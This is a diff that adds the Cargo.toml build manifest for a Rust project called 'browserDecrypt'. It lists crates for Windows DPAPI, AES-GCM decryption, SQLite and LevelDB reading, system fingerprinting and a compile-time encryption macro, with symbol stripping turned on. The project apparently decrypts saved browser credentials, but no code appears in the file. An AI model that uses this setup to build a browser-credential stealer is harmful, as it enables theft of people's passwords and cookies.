@@ -1,0 +1,25 @@
+[package]
+name = "browserDecrypt"
+version = "0.1.0"
+edition = "2021"
+
+[profile.release]
+opt-level = "z"     # Optimize for size.
+lto = "fat"         # Enable Link Time Optimization
+codegen-units = 1   # Reduce number of codegen units to increase optimizations.
+panic = "abort"     # Abort on panic
+strip = "symbols"   # Strip symbols from binary
+
+[dependencies]
+walkdir = "2"
+sysinfo = "0.24.5"
+serde_json = "1.0"
+winapi = { version = "0.3", features = ["dpapi"] }
+base64 = "0.13.0"
+rusqlite = { version = "0.28.0", features = ["bundled"] }
+uuid = { version = "1.1.2", features = ["v4"] }
+aes-gcm = "0.9.4"
+wmi = "0.11.0"
+rs-leveldb = "0.1.5"
+gethostname = "0.2.3"
+encrypt-macro = { path = "encrypt-macro" }
